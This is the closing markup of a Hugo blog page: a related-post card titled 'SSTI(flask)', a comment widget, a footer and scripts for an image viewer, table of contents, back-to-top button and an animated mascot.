</article>

            
                
<article class="has-image">
    <a href="/p/sstiflask/">
        
        
            <div class="article-image">
                <img src="/p/sstiflask/1.32ee771779f68a74b246d7e5c641ed48.png" 
                        width="2048" 
                        height="1536" 
                        loading="lazy"
                        alt="Featured image of post SSTI(flask)"
                        
                        data-hash="md5-Mu53F3n2inSyRtflxkHtSA==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">SSTI(flask)</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
<div id="waline" class="waline-container"></div>
<style>
    .waline-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
        --waline-font-size: var(--article-font-size);
    }
    .waline-container .wl-count {
        color: var(--card-text-color-main);
    }
</style><script>
    
    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://unpkg.com/@waline/emojis@1.0.1/weibo"],"locale":{"admin":"Admin","placeholder":null},"requiredMeta":["name","email","url"],"serverURL":"https://waline-test-one-smoky.vercel.app"});
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2025 Êó†ÊïåÂèØÁà±ÁæéÂíïÂôú
    </section>
    
    <section class="powerby">
        ‰ΩøÁî® <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> ÊûÑÂª∫ <br />
        ‰∏ªÈ¢ò <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> Áî± <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> ËÆæËÆ°
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

<style>
  body {
    background: url(https://0d000721999.github.io/background/1.png) no-repeat center top;
    background-size: cover;
    background-attachment: fixed;
  }
</style>

 
<style>
  @font-face {
    font-family: 'ss';
    src: url(https://0d000721999.github.io/font/SeriousShannsNerdFontMono-Regular.otf) format('opentype');
  }

  :root {
    --base-font-family: 'ss';
    --code-font-family: 'ss';
  }
</style>
<style>
    #TableOfContents > ul, ol {
        ul, ol {
            display: none;
        }
        .open {
            display: block;
        }
    }
</style>

<script>
    function initTocHide() {
        
        let toc = document.querySelector(".widget--toc");
        if (!toc) {
            return;
        }
        
        window.addEventListener('scroll', function() {
            
            let openUl = document.querySelectorAll(".open");
            if (openUl.length > 0) {
              openUl.forEach((ul) => {
                ul.classList.remove("open")
              })
            }
            
            let currentLi = document.querySelector(".active-class");
            if (!currentLi) {
                return
            }
            
            if (currentLi.children.length > 1) {
                currentLi.children[1].classList.add("open")
            }
            
            let ul = currentLi.parentElement;
            do {
                ul.classList.add("open");
                ul = ul.parentElement.parentElement
            } while (ul !== undefined && (ul.localName === 'ul' || ul.localName === 'ol'))
        });
    }
    initTocHide()
</script>

<style>
    #backTopBtn {
        display: none;
        position: fixed;
        bottom: 30px;
        z-index: 99;
        cursor: pointer;
        width: 30px;
        height: 30px;
        background-image: url(https://0d000721999.github.io/icons/backTop.svg);
    }
</style>

<script>
    

    function initScrollTop() {
        let rightSideBar = document.querySelector(".right-sidebar");
        if (!rightSideBar) {
            return;
        }
        
        let btn = document.createElement("div");
        btn.id = "backTopBtn";
        btn.onclick = backToTop
        rightSideBar.appendChild(btn)
        
        window.onscroll = function() {
            
            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
                btn.style.display = "block";
            } else {
                btn.style.display = "none";
            }
        };
    }

    

    function backToTop(){
        window.scrollTo({ top: 0, behavior: "smooth" })
    }

    initScrollTop();
</script>


<script>   
  const cdnPath = "https://cdn.jsdelivr.net/gh/0d000721999/live2d-test@main";
  const cssPath = "https://0d000721999.github.io/waifu/waifu.css"
  const config = {
    
    path: {
      homePath: "/",
      modelPath: cdnPath + "/Resources/",
      cssPath: cssPath,
      tipsJsonPath: cdnPath + "/waifu-tips.json",
      tipsJsPath: cdnPath + "/waifu-tips.js",
      live2dCorePath: cdnPath + "/Core/live2dcubismcore.js",
      live2dSdkPath: cdnPath + "/live2d-sdk.js"
    },
    
    tools: ["hitokoto", "asteroids", "express","photo", "quit"],
    
    drag: {
      enable: true,
      direction: ["x", "y"]
    },
    
    switchType: "order"
  }

  
  if (screen.width >= 768) {
    Promise.all([
      loadExternalResource(config.path.cssPath, "css"),
      loadExternalResource(config.path.live2dCorePath, "js"),
      loadExternalResource(config.path.live2dSdkPath, "js"),
      loadExternalResource(config.path.tipsJsPath, "js")
    ]).then(() => {
      initWidget({
        waifuPath: config.path.tipsJsonPath,
        cdnPath: config.path.modelPath,
        tools: config.tools,
        dragEnable: config.drag.enable,
        dragDirection: config.drag.direction,
        switchType: config.switchType
      });
    });
  }

  
  function loadExternalResource(url, type) {
    return new Promise((resolve, reject) => {
      let tag;
      if (type === "css") {
        tag = document.createElement("link");
        tag.rel = "stylesheet";
        tag.href = url;
      }
      else if (type === "js") {
        tag = document.createElement("script");
        tag.src = url;
      }
      if (tag) {
        tag.onload = () => resolve(url);
        tag.onerror = () => reject(url);
        document.head.appendChild(tag);
      }
    });
  }
</script>

    </body>
</html>
